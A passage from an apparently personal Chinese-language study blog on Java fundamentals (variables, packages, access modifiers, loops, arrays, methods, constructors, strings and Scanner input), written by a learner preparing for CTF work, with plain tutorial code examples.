(0x08)\n\n\n\\0\n空字符 (0x0)\n\n\n\\s\n空格 (0x20)\n\n\n\\t\n制表符\n\n\n&quot;\n双引号\n\n\n&#39;\n单引号\n\n\n\\\n反斜杠\n\n\n\\ddd\n八进制字符 (ddd)\n\n\n\\uxxxx\n16进制Unicode字符 (xxxx)\n\n\n和C语言一样都是使用斜杠进行转义\n2.变量类型java中声明变量和C语言中是相似的，但是在字符串的处理上面有点差异\ntype identifier [ = value][, identifier [= value] ...] ;\n\n格式说明：\n\ntype – 数据类型。\nidentifier – 是变量名，可以使用逗号 , 隔开来声明多个同类型变量。\n\n以下列出了一些变量的声明实例。注意有些包含了初始化过程。\nint a, b, c;         // 声明三个int型整数：a、 b、cint d = 3, e = 4, f = 5; // 声明三个整数并赋予初值byte z = 22;         // 声明并初始化 zString s = &quot;runoob&quot;;  // 声明并初始化字符串 sdouble pi = 3.14159; // 声明了双精度浮点型变量 pichar x = &#x27;x&#x27;;        // 声明变量 x 的值是字符 &#x27;x&#x27;。\n\n需要注意的是字符串必须使用双引号包裹，单个字符使用的这是单引号，相应的单引号中只能有一个字符\njava中支持的变量类型比C语言中多几种\n\n局部变量（Local Variables）：局部变量是在方法、构造函数或块内部声明的变量，它们在声明的方法、构造函数或块执行结束后被销毁，局部变量在声明时需要初始化，否则会导致编译错误。\n  public void exampleMethod() &#123;    int localVar = 10; // 局部变量    // ...&#125;\n\n实例变量（Instance Variables）：实例变量是在类中声明，但在方法、构造函数或块之外，它们属于类的实例，每个类的实例都有自己的副本，如果不明确初始化，实例变量会被赋予默认值（数值类型为0，boolean类型为false，对象引用类型为null）。\n  public class ExampleClass &#123;    int instanceVar; // 实例变量&#125;\n\n静态变量或类变量（Class Variables）：类变量是在类中用 static 关键字声明的变量，它们属于类而不是实例，所有该类的实例共享同一个类变量的值，类变量在类加载时被初始化，而且只初始化一次。\n  public class ExampleClass &#123;    static int classVar; // 类变量&#125;\n\n参数变量（Parameters）：参数是方法或构造函数声明中的变量，用于接收调用该方法或构造函数时传递的值，参数变量的作用域只限于方法内部。\n  public void exampleMethod(int parameterVar) &#123;    // 参数变量    // ...&#125;\n\n这里面最需要注意的是静态变量，这个和PHP中类中public那三个属性有点类似，但又很不一样\n静态变量也就是类变量会在加载类时就进行初始化，而普通变量只有在创建对象后才能使用，类中的类变量在程序开始时初始化，程序结束销毁。\njava中会使用一个代码创建包\npackage com.example;//该.java文件必须在com/example/目录下\n\n如果不使用这个代码就会在默认路径中创建包，但是网上说这样写会非常麻烦，无法被其他包的类引入(也就是不能用import，这个和不创建有什么区别)\n我个人理解就是为了区分哪些.java文件的类需要import引入。\n1. 包（Package）与文件系统的关系\n\n包名 &#x3D; 目录路径：  Java 要求包名必须与文件系统的目录结构一一对应。例如：\n包名：com.example.utils\n对应的文件路径：com/example/utils/（在项目的 src 或 java 目录下）\n\n\n.java 文件必须放在正确的包目录中：  如果类声明属于某个包（如 package com.example.utils;），则该类的 .java 文件必须放在 com/example/utils/ 目录下，否则编译会报错。\n\nmy-project/├── src/│   ├── com/│   │   ├── example/│   │   │   ├── utils/│   │   │   │   ├── StringUtils.java  // 包声明: package com.example.utils;│   │   │   ├── Main.java            // 包声明: package com.example;\n\n当我们需要使用import引入包的时候\n// Main.javapackage com.example;import com.example.utils.StringUtils;  // 导入其他包的类public class Main &#123;    public static void main(String[] args) &#123;        String str = StringUtils.reverse(&quot;Hello&quot;); // 直接使用类名    &#125;&#125;\n\n如果没有 import，则需要写全限定名\nString str = com.example.utils.StringUtils.reverse(&quot;Hello&quot;);\n\n\n\n\n包名必须全小写（约定俗成，避免冲突，如 com.example）。\n默认包（无 package 声明）：\n类文件可以直接放在 src/ 下，但强烈不建议，因为无法被其他包导入。\n\n\nIDE（如 IntelliJ&#x2F;Eclipse）会自动管理包目录：\n创建类时，如果指定包名，IDE 会自动生成对应的目录结构。\n\n\n\n也就是说在同一个目录下的.java文件package的路径也必须一致，那同一个目录下的.java文件只要package就会在同一个包中\n\n\n\n修饰符\n同包\n不同包\n子类（不同包）\n任何地方\n\n\n\npublic\n✅\n✅\n✅\n✅\n\n\nprotected\n✅\n❌\n✅\n❌\n\n\n（默认）\n✅\n❌\n❌\n❌\n\n\nprivate\n❌\n❌\n❌\n❌\n\n\n然后我们的静态变量会根据修饰符的不同，访问范围也就不同。\n值得注意的是所有默认类都会在src&#x2F;目录下，都无需声明，属于同一个默认包，然后再此默认包中默认静态变量可被所有默认包访问\n有一种特殊情况就是假如1.java文件位于com/example/目录下，但是未使用package创建包，这个时候java会忽略掉原来的目录结构，将1.java中的类算入默认包中。\n3.变量命名规则不愧是面向对象编程，连命名都来了，看一下吧。\n除了不能以数字开头也不能是关键字，命名还区分大小写以外还有一些命名技巧\n以下是各种变量命名规则的概述：\n\n使用有意义的名字： 变量名应该具有清晰的含义，能够准确地反映变量的用途。避免使用单个字符或无意义的缩写。\n驼峰命名法（Camel Case）： 在变量名中使用驼峰命名法，即将每个单词的首字母大写，除了第一个单词外，其余单词的首字母都采用大写形式。例如：myVariableName。\n避免关键字： 不要使用 Java 关键字（例如，class、int、boolean等）作为变量名。\n区分大小写： Java 是大小写敏感的，因此变量名中的大小写字母被视为不同的符号。例如，myVariable 和 myvariable 是两个不同的变量。\n不以数字开头： 变量名不能以数字开头，但可以包含数字。\n遵循命名约定： 对于不同类型的变量（局部变量、实例变量、静态变量等），可以采用不同的命名约定，例如使用前缀或后缀来区分。\n\n4.修饰符在修饰符方面Java这种高级语言还是和其他语言有很大不一样的，由于Java包的特性，在基础的修饰符上面衍生出来一个default修饰符配合public一起来修饰类。在其他语言中类一般是直接默认是全局访问的，但是java有包这个概念，于是便需要通过default来限制包内和包外的访问，java中类默认是使用default进行修饰的。\nJava的修饰符特别多，而且还有点难区分，学Java的路还有很长。\nJava语言提供了很多修饰符，主要分为以下两类：\n\n访问修饰符\n非访问修饰符\n\n修饰符用来定义类、方法或者变量，通常放在语句的最前端。我们通过下面的例子来说明：\npublic class ClassName &#123;   // ...&#125;private boolean myFlag;static final double weeks = 9.5;protected static final int BOXWIDTH = 42;public static void main(String[] arguments) &#123;   // 方法体&#125;\n\n\n\n访问修饰符\nJava中，可以使用访问控制符来保护对类、变量、方法和构造方法的访问。Java 支持 4 种不同的访问权限。\n\ndefault (即默认，什么也不写）: 在同一包内可见，不使用任何修饰符。使用对象：类、接口、变量、方法。\nprivate : 在同一类内可见。使用对象：变量、方法。 注意：不能修饰类（外部类）\npublic : 对所有类可见。使用对象：类、接口、变量、方法\nprotected : 对同一包内的类和所有子类可见。使用对象：变量、方法。 注意：不能修饰类（外部类）。\n\n我们可以通过以下表来说明访问权限：\n\n\n\n修饰符\n当前类\n同一包内\n子孙类(同一包)\n子孙类(不同包)\n其他包\n\n\n\npublic\nY\nY\nY\nY\nY\n\n\nprotected\nY\nY\nY\nY&#x2F;N（特殊）\nN\n\n\ndefault\nY\nY\nY\nN\nN\n\n\nprivate\nY\nN\nN\nN\nN\n\n\n变量和方法的声明可以不使用任何修饰符\n默认修饰符\n如果在类、变量、方法或构造函数的定义中没有指定任何访问修饰符，那么它们就默认具有默认访问修饰符。\n默认访问修饰符的访问级别是包级别（package-level），即只能被同一包中的其他类访问。\n如下例所示，变量和方法的声明可以不使用任何修饰符。\n// MyClass.java class MyClass &#123;  // 默认访问修饰符     int x = 10;  // 默认访问修饰符     void display() &#123;  // 默认访问修饰符        System.out.println(&quot;Value of x is: &quot; + x);    &#125;&#125; // MyOtherClass.java class MyOtherClass &#123;    public static void main(String[] args) &#123;        MyClass obj = new MyClass();//访问到其他文件的类        obj.display();  // 访问 MyClass 中的默认访问修饰符变量和方法    &#125;&#125;//应该是由于未使用package语句创建包，导致都在默认包中可以直接访问\n\n以上实例中，MyClass 类和它的成员变量 x 和方法 display() 都使用默认访问修饰符进行了定义。MyOtherClass 类在同一包中，因此可以访问 MyClass 类和它的成员变量和方法。\nprivate\n私有访问修饰符是最严格的访问级别，所以被声明为 private 的方法、变量和构造方法只能被所属类访问，并且类和接口不能声明为 private。\n声明为私有访问类型的变量只能通过类中公共的 getter 方法被外部类访问。\nPrivate 访问修饰符的使用主要用来隐藏类的实现细节和保护类的数据。\n下面的类使用了私有访问修饰符：\npublic class Logger &#123;   private String format;   public String getFormat() &#123;      return this.format;   &#125;   public void setFormat(String format) &#123;      this.format = format;   &#125;&#125;\n\n\n\npublic\n被声明为 public 的类、方法、构造方法和接口能够被任何其他类访问。\n如果几个相互访问的 public 类分布在不同的包中，则需要导入相应 public 类所在的包。由于类的继承性，类所有的公有方法和变量都能被其子类继承。\n以下函数使用了公有访问控制：\npublic static void main(String[] arguments) &#123;   // ...&#125;\n\nJava 程序的 main() 方法必须设置成公有的，否则，Java 解释器将不能运行该类。\nprotected\nprotected 需要从以下两个点来分析说明：\n\n子类与基类在同一包中：被声明为 protected 的变量、方法和构造器能被同一个包中的任何其他类访问；\n子类与基类不在同一包中：那么在子类中，子类实例可以访问其从基类继承而来的 protected 方法，而不能访问基类实例的protected方法。\n\nprotected 可以修饰数据成员，构造方法，方法成员，不能修饰类（内部类除外）。\n接口及接口的成员变量和成员方法不能声明为 protected。\n// 定义接口public interface Animal &#123;    void eat();    // 抽象方法    void sleep();  // 抽象方法&#125;// 实现接口public class Dog implements Animal &#123;    @Override    public void eat() &#123;        System.out.println(&quot;Dog is eating&quot;);    &#125;        @Override    public void sleep() &#123;        System.out.println(&quot;Dog is sleeping&quot;);    &#125;&#125;\n\n其他的修饰符也就是非访问修饰符和CTF没什么关系了吧，那就不学了，反正后面遇到了不懂肯定还会回来的。\n5.运算符关于运算符没有什么好写的了，各种语言中基本一样，等到遇到不一样的再来补充一下吧。\n6.循环语句和其他语言一样，java中也是由while循环和for循环主要组成的\nwhile循环\nwhile( 布尔表达式 ) &#123;  //循环内容&#125;\n\n只要布尔表达式为 true，循环就会一直执行下去。\npublic class Test &#123;   public static void main(String[] args) &#123;      int x = 10;      while( x &lt; 20 ) &#123;         System.out.print(&quot;value of x : &quot; + x );         x++;         System.out.print(&quot;\\n&quot;);      &#125;   &#125;&#125;\n\n运行结果如下\nvalue of x : 10value of x : 11value of x : 12value of x : 13value of x : 14value of x : 15value of x : 16value of x : 17value of x : 18value of x : 19\n\n\n\ndo…while循环\n对于 while 语句而言，如果不满足条件，则不能进入循环。但有时候我们需要即使不满足条件，也至少执行一次。\ndo…while 循环和 while 循环相似，不同的是，do…while 循环至少会执行一次。\npublic class Test &#123;   public static void main(String[] args)&#123;      int x = 10;       do&#123;         System.out.print(&quot;value of x : &quot; + x );         x++;         System.out.print(&quot;\\n&quot;);      &#125;while( x &lt; 20 );   &#125;&#125;\n\n我们需要注意的就是只有在第一次循环的时候会因为do而可以进行循环，后面和while循环一致\n\n\nfor循环\nfor循环可以使循环代码变的比while和do while循环简单一点\n关于 for 循环有以下几点说明：\n\n最先执行初始化步骤。可以声明一种类型，但可初始化一个或多个循环控制变量，也可以是空语句。\n然后，检测布尔表达式的值。如果为 true，循环体被执行。如果为false，循环终止，开始执行循环体后面的语句。\n执行一次循环后，更新循环控制变量。\n再次检测布尔表达式。循环执行上面的过程。\n\n实例\npublic class Test &#123;   public static void main(String[] args) &#123;       for(int x = 10; x &lt; 20; x = x+1) &#123;         System.out.print(&quot;value of x : &quot; + x );         System.out.print(&quot;\\n&quot;);      &#125;   &#125;&#125;\n\n和C语言差不多呢\n7.条件语句这个也和C语言一样是if ，else ， else if 语句\n我们一个代码就可以总结一下\npublic class Test &#123;   public static void main(String args[])&#123;      int x = 30;       if( x == 10 )&#123;         System.out.print(&quot;Value of X is 10&quot;);      &#125;else if( x == 20 )&#123;         System.out.print(&quot;Value of X is 20&quot;);      &#125;else if( x == 30 )&#123;         System.out.print(&quot;Value of X is 30&quot;);      &#125;else&#123;         System.out.print(&quot;这是 else 语句&quot;);      &#125;   &#125;&#125;\n\nelse if就是在if筛选过后的结果中再进行筛选，else则是将所有筛选过后的语句。\n还有就是if  else语句的嵌套，这个还是和C语言一致\n8.switch caseswitch case 语句判断一个变量与一系列值中某个值是否相等，每个值称为一个分支。\n就是switch 语句中后面加的case的值，如果相等就执行对应case后面的语句，如果运行结束还没匹配则执行default语句\npublic class Test &#123;   public static void main(String args[])&#123;      //char grade = args[0].charAt(0);      char grade = &#x27;C&#x27;;       switch(grade)      &#123;         case &#x27;A&#x27; :            System.out.println(&quot;优秀&quot;);             break;         case &#x27;B&#x27; :         case &#x27;C&#x27; :            System.out.println(&quot;良好&quot;);            break;         case &#x27;D&#x27; :            System.out.println(&quot;及格&quot;);            break;         case &#x27;F&#x27; :            System.out.println(&quot;你需要再努力努力&quot;);            break;         default :            System.out.println(&quot;未知等级&quot;);      &#125;      System.out.println(&quot;你的等级是 &quot; + grade);   &#125;&#125;\n\n\n\nbreak和continue\n讲完基本的条件和循环语句了就需要再来看看break和continue语句\n在一个循环中，如果执行了break语句则立刻跳出当前循环，并不会执行后面的语句，循环结束\n循环中如果触发了continue语句则跳出这次循环，不会执行后面的语句，然后跳转的判断语句\n9.数组java中数组的声明和数组的创建是两个概念。\n我们学过的C语言可以知道，在我们在直接定义一个数组变量的时候需要进行下标定义，下标定义必须是一个常量，否则就会编译错误。但是我们有一个方法去实现数组长度的变化，就是先定义一个指针，然后使用malloc对指针指向的地址进行内存分配\n// 1. 声明指针（类似Java的数组声明）int *array;   // 只声明指针，未分配数组内存// 2. 动态内存分配（类似Java的数组创建）array = (int*)malloc(5 * sizeof(int));  // 堆内存分配\n\n\n\njava中则是将这种形式转变为类似的数组声明和创建模式，也就是说数组声明是不会进行内存分配，在数组创建才能放值。\n数组变量的声明\ndataType[] arrayRefVar;   // 首选的方法 或 dataType arrayRefVar[];  // 效果相同，但不是首选方法double[] myList;         // 首选的方法 或 double myList[];         //  效果相同，但不是首选方法\n\n\n\n创建数组\nJava语言使用new操作符来创建数组，语法如下：\narrayRefVar = new dataType[arraySize];\n\n上面的语法语句做了两件事：\n\n一、使用 dataType[arraySize] 创建了一个数组。\n二、把新创建的数组的引用赋值给变量 arrayRefVar。\n\n数组变量的声明，和创建数组可以用一条语句完成，如下所示：\ndataType[] arrayRefVar = new dataType[arraySize];\n\n另外，你还可以使用如下的方式创建数组。\ndataType[] arrayRefVar = &#123;value0, value1, ..., valuek&#125;;//这个和C语言中在创建数组时可以不用长度，系统自己分配一样\n\n数组的元素是通过索引访问的。数组索引从 0 开始，所以索引值从 0 到 arrayRefVar.length-1。\n实例\npublic class TestArray &#123;   public static void main(String[] args) &#123;      // 数组大小      int size = 10;      // 定义数组      double[] myList = new double[size];      myList[0] = 5.6;      myList[1] = 4.5;      myList[2] = 3.3;      myList[3] = 13.2;      myList[4] = 4.0;      myList[5] = 34.33;      myList[6] = 34.0;      myList[7] = 45.45;      myList[8] = 99.993;      myList[9] = 11123;      // 计算所有元素的总和      double total = 0;      for (int i = 0; i &lt; size; i++) &#123;         total += myList[i];      &#125;      System.out.println(&quot;总和为： &quot; + total);   &#125;&#125;//总和为： 11367.373\n\n\n\nFor-Each循环\n之前在C语言中的数组遍历都是通过for和while循环改变数组下标实现遍历，但是在php中有一个foreach循环，可以不用更改下标，直接自动遍历数组。\njava中也有和php中foreach循环类似的循环语句，但是不知道为什么名字里面有each，但实际上没有\nfor(type element: array)&#123;    System.out.println(element);&#125;//type element指的是数组元素\n\n实例\npublic class TestArray &#123;   public static void main(String[] args) &#123;      double[] myList = &#123;1.9, 2.9, 3.4, 3.5&#125;;       // 打印所有数组元素      for (double element: myList) &#123;         System.out.println(element);      &#125;   &#125;&#125;\n\n\n\n数组作为函数参数和返回值\n和C语言中一样，作为函数参数就是从新声明一下变量，这也就是为什么C语言中也可以使用相同类型的指针作为数组参数\npublic static int[] reverse(int[] list) &#123;  int[] result = new int[list.length];   for (int i = 0, j = result.length - 1; i &lt; list.length; i++, j--) &#123;    result[j] = list[i];  &#125;  return result;&#125;\n\n\n\n10.方法之前在PHP中就接触过方法了，方法就是在类中的函数，同时前面还可以带有public等修饰符\n在前面几个章节中我们经常使用到 **System.out.println()**，那么它是什么呢？\n\nprintln() 是一个方法。\nSystem 是系统类。\nout 是标准输出对象。\n\n这句话的用法是调用系统类 System 中的标准输出对象 out 中的方法 println()。\nSystem\n\n是 Java 中的一个 final 类（位于 java.lang 包）\n提供标准输入、输出和错误流等系统相关功能\n\n out\n\n是 System 类中的一个静态 PrintStream 类型成员变量\n代表”标准输出流”（standard output stream）\n默认指向控制台（Console）输出\n\n println()\n\nPrintStream 类的方法\n功能：打印参数内容并添加换行符\nprint() 方法类似，但不换行\n可以接受各种数据类型参数（自动调用对象的 toString() 方法）\n\n这也就是说System.out.println()实际上是从System这个文件中找到一个静态类PrintStream，然后通过out指向控制台输出，然后调用类中println方法\n方法包含一个方法头和一个方法体。下面是一个方法的所有部分：\n\n修饰符：修饰符，这是可选的，告诉编译器如何调用该方法。定义了该方法的访问类型。\n返回值类型 ：方法可能会返回值。returnValueType 是方法返回值的数据类型。有些方法执行所需的操作，但没有返回值。在这种情况下，returnValueType 是关键字void。\n方法名：是方法的实际名称。方法名和参数表共同构成方法签名。\n参数类型：参数像是一个占位符。当方法被调用时，传递值给参数。这个值被称为实参或变量。参数列表是指方法的参数类型、顺序和参数的个数。参数是可选的，方法可以不包含任何参数。\n方法体：方法体包含具体的语句，定义该方法的功能。\n\n\n\n实例\n/** 返回两个整型变量数据的较大值 */public static int max(int num1, int num2) &#123;   int result;   if (num1 &gt; num2)      result = num1;   else      result = num2;    return result; &#125;\n\n\n\n方法的调用\npublic class TestMax &#123;   /** 主方法 */   public static void main(String[] args) &#123;      int i = 5;      int j = 2;      int k = max(i, j);      System.out.println( i + &quot; 和 &quot; + j + &quot; 比较，最大值是：&quot; + k);   &#125;    /** 返回两个整数变量较大的值 */   public static int max(int num1, int num2) &#123;      int result;      if (num1 &gt; num2)         result = num1;      else         result = num2;       return result;    &#125;&#125;\n\n\n\n方法的重载\n在C语言中不允许出现那种名字相同但参数不同的两个同名函数，但是在java中这个叫做函数的重载，在类中自然就加方法重载\n上面使用的max方法仅仅适用于int型数据。但如果你想得到两个浮点类型数据的最大值呢？\n解决方法是创建另一个有相同名字但参数不同的方法，如下面代码所示：\npublic static double max(double num1, double num2) &#123;  if (num1 &gt; num2)    return num1;  else    return num2;&#125;\n\n如果你调用max方法时传递的是int型参数，则 int型参数的max方法就会被调用；\n如果传递的是double型参数，则double类型的max方法体会被调用，这叫做方法重载；\n就是说一个类的两个方法拥有相同的名字，但是有不同的参数列表。\nJava编译器根据方法签名判断哪个方法应该被调用。\n方法重载可以让程序更清晰易读。执行密切相关任务的方法应该使用相同的名字。\n重载的方法必须拥有不同的参数列表。你不能仅仅依据修饰符或者返回类型的不同来重载方法。\n11.构造方法我们之前在学PHP反序列化的时候出现了魔术方法，会在特定条件下进行调用。\n但是在java中没有那么多魔术方法，只用一个构造方法用于初始化对象的属性\n构造方法具有以下几个特点：\n\n与类名相同：构造方法的名称必须与类名完全一致，包括大小写。这是构造方法的一个基本要求。\n没有返回类型：构造方法没有返回类型声明，即使是 void 也不写。这使得它与普通方法区分开来。\n自动调用：每次使用 new 创建对象时，构造方法会自动调用，以初始化对象的属性和状态。\n不能直接调用：构造方法只能通过 new 关键字在创建对象时调用，不能像普通方法那样直接调用。\n支持重载：可以为一个类定义多个构造方法，只要它们的参数列表不同。通过重载，可以创建不同的构造方法以适应不同的初始化需求。\n默认构造方法：如果没有定义任何构造方法，Java 会提供一个无参的默认构造方法。但一旦定义了任何其他构造方法，Java 不再提供默认构造方法。\nthis 关键字的使用：在构造方法中可以使用 this 来引用当前对象的属性、方法，或调用另一个构造方法（必须是构造方法的第一行），以避免重复代码。\n不能被继承，但可以被调用：构造方法不能被子类继承，但子类可以使用 super() 来调用父类的构造方法，以便初始化继承的属性。\n对象初始化保障：构造方法的主要作用是初始化对象的属性和状态，保证对象在创建时处于一个合法的初始状态。\n\n构造方法的作用：\n\n初始化对象属性：构造方法的主要作用是为对象的属性赋初值。\n保证对象初始化的完整性：在构造方法中可以设置默认值或必要参数，从而避免对象未完全初始化的问题。\n\n构造方法又分为有参构造方法和无参构造方法\n无参构造方法\n如果一个类中没有定义任何构造方法，Java 会默认提供一个无参构造方法。例如：\npublic class Person &#123;    // 没有定义任何构造方法    String name;&#125;// 实际上相当于：public class Person &#123;    String name;        // 编译器自动添加的    public Person() &#123;        // 空实现    &#125;&#125;\n\n根据添加了也没什么用\npublic class Person &#123;    public Person() &#123;        System.out.println(&quot;Person对象已创建&quot;);    &#125;&#125;\n\n\n在没有显式定义构造方法时，Java 自动提供一个默认的无参构造方法。\n一旦定义了其他构造方法，Java 将不再提供默认构造方法。\n\n有参构造方法\n可以定义带有参数的构造方法，用来在创建对象时为属性赋值：\npublic class Person &#123;    String name;    int age;    public Person(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;&#125;\n\n调用有参构造方法时，可以为对象的属性进行初始化：\nPerson p = new Person(&quot;Alice&quot;, 25);\n\n还有就是在每次new对象的时候，只能为一个有参构造方法传递参数，也就是说只能触发一个有参构造方法，但是至于是怎么识别调用的是哪个构造方法\n\n精确匹配原则：优先匹配参数类型完全一致的构造方法\n类型兼容原则：如果没有精确匹配，会寻找参数类型兼容的构造方法（如子类可以匹配父类参数）\n数量匹配原则：参数数量必须严格匹配\n顺序敏感原则：参数顺序不同会被视为不同的构造方法\n\n当然也有其他方法可以触发多个有参构造方法，就是使用构造方法链\nclass Person &#123;    String name;    int age;        Person(String name) &#123;        this(name, 0); // 调用下面的两参构造方法    &#125;        Person(int age) &#123;        this(&quot;Unknown&quot;, age); // 调用下面的两参构造方法    &#125;        Person(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;&#125;// 使用示例Person p1 = new Person(&quot;Alice&quot;);  // name=&quot;Alice&quot;, age=0Person p2 = new Person(25);      // name=&quot;Unknown&quot;, age=25Person p3 = new Person(&quot;Bob&quot;, 30); // 完整初始化\n\n\n\n12.Character类光看名字就知道这是一个和字符有关的，java中声明一个字符变量直接用char，即可，实在不知道这个类有什么用，说是这个内置类中存放了一系列操作字符的方法\nchar ch = &#x27;a&#x27;; // Unicode 字符表示形式char uniChar = &#x27;\\u039A&#x27;;  // 字符数组char[] charArray =&#123; &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27; &#125;;\n\n然而，在实际开发过程中，我们经常会遇到需要使用对象，而不是内置数据类型的情况。为了解决这个问题，Java语言为内置数据类型char提供了包装类Character类。\nCharacter类提供了一系列方法来操纵字符。你可以使用Character的构造方法创建一个Character类对象，例如：\nCharacter ch = new Character(&#x27;a&#x27;);//这个就是实例化了一个对象\n\n至于Character类提供了哪些方法，以后会知道的\n下面是Character类的方法：\n\n\n\n序号\n方法与描述\n\n\n\n1\nisLetter() 是否是一个字母\n\n\n2\nisDigit() 是否是一个数字字符\n\n\n3\nisWhitespace() 是否是一个空白字符\n\n\n4\nisUpperCase() 是否是大写字母\n\n\n5\nisLowerCase() 是否是小写字母\n\n\n6\ntoUpperCase() 指定字母的大写形式\n\n\n7\ntoLowerCase() 指定字母的小写形式\n\n\n8\ntoString() 返回字符的字符串形式，字符串的长度仅为1\n\n\n13.String类在C语言中定义一个字符串是通过字符数组或者字符指针进行操作的，java中虽然也可以定义字符数组，但是可以通过声明String变量的方法去声明一个字符串，这是由于在Java中字符串属于一个对象，我想这也是为了更好的实现字符串操作\n字符串广泛应用 在 Java 编程中，在 Java 中字符串属于对象，Java 提供了 String 类来创建和操作字符串。\nString str = &quot;Runoob&quot;;\n\n在代码中遇到字符串常量时，这里的值是 “Runoob“，编译器会使用该值创建一个 String 对象。\n和其它对象一样，可以使用关键字和构造方法来创建 String 对象。\n用构造函数创建字符串：\nString str2=new String(&quot;Runoob&quot;);\n\nString 创建的字符串存储在公共池中，而 new 创建的字符串对象在堆上：\nString s1 = &quot;Runoob&quot;;              // String 直接创建String s2 = &quot;Runoob&quot;;              // String 直接创建String s3 = s1;                    // 相同引用String s4 = new String(&quot;Runoob&quot;);   // String 对象创建String s5 = new String(&quot;Runoob&quot;);   // String 对象创建\n\n公共池中就是会将Runoob这个先放入池中创建对象，后面等到再次有变量使用到Runoob的时候两个变量名在公共池中指向这个字符串，避免了重复对象的创建，节约内存。\n至于通过new对象创建的字符串则是在堆中创建一个对象，无论堆中是否存在Runoob都会在复制一份\n\n\nString 类有 11 种构造方法，这些方法提供不同的参数来初始化字符串，比如提供一个字符数组参数:\npublic class StringDemo&#123;   public static void main(String args[])&#123;      char[] helloArray = &#123; &#x27;r&#x27;, &#x27;u&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;o&#x27;, &#x27;b&#x27;&#125;;      String helloString = new String(helloArray);        System.out.println( helloString );   &#125;&#125;\n\n以上实例编译运行结果如下：\nrunoob\n\nString类的方法太多了，要用到的时候在说吧\n14.StringBuffer 和 StringBuilder 类既然到了字符串就不得不提到这个烦死人的东西了，在学C语言的时候就被字符串的各种修改给整麻了，如果是拼接还好，往字符串中插入一个字符需要把后面的字符全部后退一位，不知道在java中怎么办\n当对字符串进行修改的时候，需要使用 StringBuffer 和 StringBuilder 类。\n和 String 类不同的是，StringBuffer 和 StringBuilder 类的对象能够被多次的修改，并且不产生新的未使用对象。\n\n\n在使用 StringBuffer 类时，每次都会对 StringBuffer 对象本身进行操作，而不是生成新的对象，所以如果需要对字符串进行修改推荐使用 StringBuffer。\nStringBuilder 类在 Java 5 中被提出，它和 StringBuffer 之间的最大不同在于 StringBuilder 的方法不是线程安全的（不能同步访问）。\n由于 StringBuilder 相较于 StringBuffer 有速度优势，所以多数情况下建议使用 StringBuilder 类。\npublic class RunoobTest&#123;    public static void main(String[] args)&#123;        StringBuilder sb = new StringBuilder(10);        sb.append(&quot;Runoob..&quot;);        System.out.println(sb);          sb.append(&quot;!&quot;);        System.out.println(sb);         sb.insert(8, &quot;Java&quot;);        System.out.println(sb);         sb.delete(5,8);        System.out.println(sb);      &#125;&#125;\n\n运行结果为\nRunoob..Runoob..!Runoob..Java!RunooJava!\n\n\n\n\n话说这个图片怎么突然变成svg了\njava中有了这两个方法终于不需要再去搞数组的下标了。\n15.Scanner 类实话说有一点生草，到这个地步了，我竟然不知道java中该如何输入，还真的是一点有关算法的代码都不写了，但是好像其实也不要用到命令行输入，实在要输入还不如直接用表单传递比较方便。\njava.util.Scanner 是 Java5 的新特征，我们可以通过 Scanner 类来获取用户的输入。\n下面是创建 Scanner 对象的基本语法：\nScanner s = new Scanner(System.in);\n\n接下来我们演示一个最简单的数据输入，并通过 Scanner 类的 next() 与 nextLine() 方法获取输入的字符串，在读取前我们一般需要 使用 hasNext 与 hasNextLine 判断是否还有输入的数据：\nnext方法\nimport java.util.Scanner;  public class ScannerDemo &#123;    public static void main(String[] args) &#123;        Scanner scan = new Scanner(System.in);        // 从键盘接收数据         // next方式接收字符串        System.out.println(&quot;next方式接收：&quot;);        // 判断是否还有输入        if (scan.hasNext()) &#123;            String str1 = scan.next();            System.out.println(&quot;输入的数据为：&quot; + str1);        &#125;        scan.close();    &#125;&#125;\n\n执行以上程序输出结果为：\n$ javac ScannerDemo.java$ java ScannerDemonext方式接收：runoob com输入的数据为：runoob\n\n可以看到 com 字符串并未输出，接下来我们看 nextLine。\n使用nextLine方法\nimport java.util.Scanner; public class ScannerDemo &#123;    public static void main(String[] args) &#123;        Scanner scan = new Scanner(System.in);        // 从键盘接收数据         // nextLine方式接收字符串        System.out.println(&quot;nextLine方式接收：&quot;);        // 判断是否还有输入        if (scan.hasNextLine()) &#123;            String str2 = scan.nextLine();            System.out.println(&quot;输入的数据为：&quot; + str2);        &#125;        scan.close();    &#125;&#125;\n\n执行以上程序输出结果为：\n$ javac ScannerDemo.java$ java ScannerDemonextLine方式接收：runoob com输入的数据为：runoob com\n\n可以看到 com 字符串输出。\nnext() 与 nextLine() 区别\nnext():\n\n1、一定要读取到有效字符后才可以结束输入。\n2、对输入有效字符之前遇到的空白，next() 方法会自动将其去掉。\n3、只有输入有效字符后才将其后面输入的空白作为分隔符或者结束符。\n4、next() 不能得到带有空格的字符串。\n\nnextLine()：\n\n1、以Enter为结束符,也就是说 nextLine()方法返回的是输入回车之前的所有字符。\n2、可以获得空白。\n\n如果要输入 int 或 float 类型的数据，在 Scanner 类中也有支持，但是在输入之前最好先使用 hasNextXxx() 方法进行验证，再使用 nextXxx() 来读取：\nimport java.util.Scanner; public class ScannerDemo &#123;    public static void main(String[] args) &#123;        Scanner scan = new Scanner(System.in);        // 从键盘接收数据        int i = 0;        float f = 0.0f;//Java中默认的浮点数字面量（如0.0）是double类型（64位）。//float是32位类型，直接赋值double给float会导致编译错误（精度损失风险）。//加f后缀显式告诉编译器：这是一个float类型，允许直接赋值。        System.out.print(&quot;输入整数：&quot;);        if (scan.hasNextInt()) &#123;            // 判断输入的是否是整数            i = scan.nextInt();            // 接收整数            System.out.println(&quot;整数数据：&quot; + i);        &#125; else &#123;            // 输入错误的信息            System.out.println(&quot;输入的不是整数！&quot;);        &#125;        System.out.print(&quot;输入小数：&quot;);        if (scan.hasNextFloat()) &#123;            // 判断输入的是否是小数            f = scan.nextFloat();            // 接收小数            System.out.println(&quot;小数数据：&quot; + f);        &#125; else &#123;            // 输入错误的信息            System.out.println(&quot;输入的不是小数！&quot;);        &#125;        scan.close();    &#125;&#125;\n\n执行以上程序输出结果为：\n$ javac ScannerDemo.java$ java ScannerDemo输入整数：12整数数据：12输入小数：1.2小数数据：1.2\n\n以下实例我们可以输入多个数字，并求其总和与平均数，每输入一个数字用回车确认，通过输入非数字来结束输入并输出执行结果：\nimport java.util.Scanner; class RunoobTest &#123;    public static void main(String[] args) &#123;        